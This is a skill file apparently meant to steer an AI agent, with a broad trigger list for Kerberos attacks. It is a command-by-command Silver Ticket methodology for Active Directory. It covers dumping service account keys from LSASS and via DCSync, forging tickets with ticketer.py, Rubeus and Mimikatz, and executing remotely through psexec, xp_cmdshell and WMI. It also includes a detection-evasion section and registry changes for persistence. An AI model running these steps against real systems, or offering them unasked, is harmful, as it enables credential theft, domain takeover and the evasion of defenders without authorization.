---
name: silver-ticket-attack
description: Forge and abuse Kerberos Silver Tickets in Active Directory environments. Use this skill whenever the user mentions silver tickets, TGS forgery, service ticket attacks, Kerberos abuse, SPN exploitation, or needs to impersonate users to specific AD services. Also trigger when discussing AES/RC4 key extraction, ticketer.py, Rubeus asktgs, or Mimikatz kerberos::golden with service targets. Make sure to use this skill for any AD Kerberos attack involving service accounts, even if the user doesn't explicitly say "silver ticket."
---

# Silver Ticket Attack Methodology

Forge Ticket Granting Service (TGS) tickets to impersonate any user to specific Active Directory services using service account credentials.

## When to Use This Skill

- You have a service account hash (NTLM or AES key) and need to access a specific service
- You want to impersonate any user to a target service without touching the DC
- You're working in modern AES-only domains (post-Nov 2022 KB5021131)
- You need to access CIFS, HOST, RPCSS, LDAP, MSSQL, or other AD services
- You want to chain with Potato techniques for SYSTEM escalation

## Critical Modern Kerberos Changes

**Windows updates from Nov 2022 (KB5021131) default to AES session keys:**

- RC4 is being phased out; DCs will ship with RC4 disabled by default by mid-2026
- Relying on NTLM/RC4 hashes increasingly fails with `KRB_AP_ERR_MODIFIED`
- **Always extract AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for service accounts
- If `msDS-SupportedEncryptionTypes` is restricted to AES, RC4 will not work even with the NTLM hash
- gMSA/computer accounts rotate every 30 days - dump the **current AES key** before forging
- **OPSEC**: Default ticket lifetime is often 10 years; set realistic durations (e.g., `-duration 600` minutes)

## Prerequisites

1. **Service account credentials**: NTLM hash or AES key of a service account with an SPN
2. **Domain SID**: Required for ticket forgery
3. **Target service SPN**: The service principal name you want to forge for
4. **Domain name**: The AD domain name

## Attack Workflow

### Step 1: Extract Service Account Keys

**From LSASS (local admin):**
```bash
# Linux (impacket-secretsdump)
python secretsdump.py -lsass /path/to/dump.zip DOMAIN/username@target

# Windows (Mimikatz)
mimikatz.exe "sekurlsa::logonpasswords"
```

**From DC (DCSync):**
```bash
mimikatz.exe "lsadump::dcsync /user:serviceaccount"
```

**From keytab file:**
```bash
# If you have a .keytab, extract the AES key from it
```

### Step 2: Forge the Silver Ticket

**On Linux (impacket ticketer.py):**

```bash
# Forge with AES256 (recommended for modern domains)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER_TO_IMPERSONATE>

# Forge with AES128
python ticketer.py -aesKey <AES128_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER_TO_IMPERSONATE>

# Read key directly from keytab file
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# With shortened validity for stealth (480 minutes = 8 hours)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>
```

**On Windows (Rubeus):**

```bash
# Request service ticket with AES256
rubeus.exe asktgs /user:<USER> /aes256:<HASH> /domain:<DOMAIN> \
  /ldap /service:<SPN> /ptt /nowrap /printcmd

# Request service ticket with AES128
rubeus.exe asktgs /user:<USER> /aes128:<HASH> /domain:<DOMAIN> \
  /ldap /service:<SPN> /ptt /nowrap /printcmd

# RC4 (only works if DC/service still accepts it)
rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:<DOMAIN> \
  /ldap /service:<SPN> /ptt /nowrap /printcmd
```

**On Windows (Mimikatz):**

```bash
# AES256 silver ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# AES128 silver ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes128:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# RC4 (legacy, may fail on modern domains)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged .kirbi ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
```

### Step 3: Use the Forged Ticket

**Linux (impacket):**
```bash
export KRB5CCNAME=/path/to/ticket.ccache

# Access via SMB/psexec
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass

# Access MSSQL
impacket-mssqlclient -k -no-pass <DOMAIN>/<USER>@<TARGET>:1433
```

**Windows:**
```bash
# After PTT, use PsExec
PsExec.exe -accepteula \\<TARGET> cmd

# Or use the commands printed by Rubeus /printcmd
```

## Service SPN Reference

| Service | SPN Format | Use Case |
|---------|------------|----------|
| CIFS | `cifs/<HOST_FQDN>` | File shares, C$, ADMIN$, psexec |
| HOST | `host/<HOST_FQDN>` | Scheduled tasks, WMI |
| RPCSS | `rpcss/<HOST_FQDN>` | WMI, remote administration |
| LDAP | `ldap/<DC_FQDN>` | DCSync, AD queries |
| MSSQL | `MSSQLSvc/<HOST_FQDN>:1433` | SQL Server access |
| HTTP | `http/<HOST_FQDN>` | WinRM, web services |
| WSMAN | `wsman/<HOST_FQDN>` | PowerShell remoting |
| WINRM | `winrm/<HOST_FQDN>` | WinRM access |
| krbtgt | `krbtgt/<DOMAIN>` | Golden tickets (requires krbtgt hash) |

**Rubeus multi-service request:**
```bash
rubeus.exe asktgs /altservice:host,RPCSS,http,wsman,cifs,ldap,winrm /ptt
```

## Common Attack Paths

### CIFS Access (File Shares + PsExec)
```bash
# Forge ticket for CIFS
python ticketer.py -aesKey <HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn cifs/<TARGET_FQDN> administrator

export KRB5CCNAME=$PWD/administrator.ccache

# Access shares
dir \\\<TARGET_FQDN>\C$
dir \\\<TARGET_FQDN>\ADMIN$

# Execute via psexec
python psexec.py <DOMAIN>/administrator@<TARGET> -k -no-pass
```

### MSSQL + Potato to SYSTEM
```bash
# Forge ticket for MSSQL
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<HOST_FQDN>:1433 administrator

export KRB5CCNAME=$PWD/administrator.ccache

# Connect and enable xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<HOST_FQDN>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"

# If SeImpersonatePrivilege exists, chain Potato
# Upload and run PrintSpoofer/GodPotato for SYSTEM
```

### WMI Execution (HOST + RPCSS)
```bash
# Forge tickets for HOST and RPCSS
python ticketer.py -aesKey <HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn host/<TARGET_FQDN> administrator

# Execute WMI commands
Invoke-WmiMethod -class win32_operatingsystem -ComputerName <TARGET>
Invoke-WmiMethod win32_process -ComputerName <TARGET> -name create \
  -argumentlist "<COMMAND>"
```

### DCSync (LDAP)
```bash
# Forge LDAP ticket
python ticketer.py -aesKey <HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn ldap/<DC_FQDN> administrator

# Perform DCSync
mimikatz.exe "lsadump::dcsync /dc:<DC_FQDN> /domain:<DOMAIN> /user:krbtgt"
```

## Detection Evasion

**Event IDs to monitor:**
- 4624: Account Logon
- 4634: Account Logoff  
- 4672: Admin Logon
- **No preceding 4768/4769 on DC** indicates forged TGS
- Abnormally long ticket lifetime stands out
- Unexpected encryption type (RC4 in AES-only domain) is suspicious

**Evasion techniques:**
1. Use realistic ticket durations (1-8 hours, not 10 years)
2. Match the encryption type to domain policy (prefer AES)
3. Time attacks during normal business hours
4. Use legitimate-looking usernames
5. Avoid rapid successive authentications

## Persistence

**Disable machine account password rotation:**
```reg
HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1
```

**Extend password rotation period:**
```reg
HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge = <DAYS>
```

## Troubleshooting

**KRB_AP_ERR_MODIFIED:**
- Domain enforces AES but you're using RC4
- Extract AES key instead of NTLM hash
- Check `msDS-SupportedEncryptionTypes` on the service account

**Ticket rejected:**
- Verify Domain SID is correct
- Ensure SPN format matches exactly (case-sensitive)
- Check ticket hasn't expired
- Verify service account hash/key is current (gMSA rotates every 30 days)

**Cannot access service:**
- Service may not be running on target
- Firewall may block the service port
- Service account may lack permissions for the action

## References

- [Ired - Kerberos Silver Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [Microsoft KB50211131 - Kerberos Hardening](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966)
- [Impacket ticketer.py Documentation](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
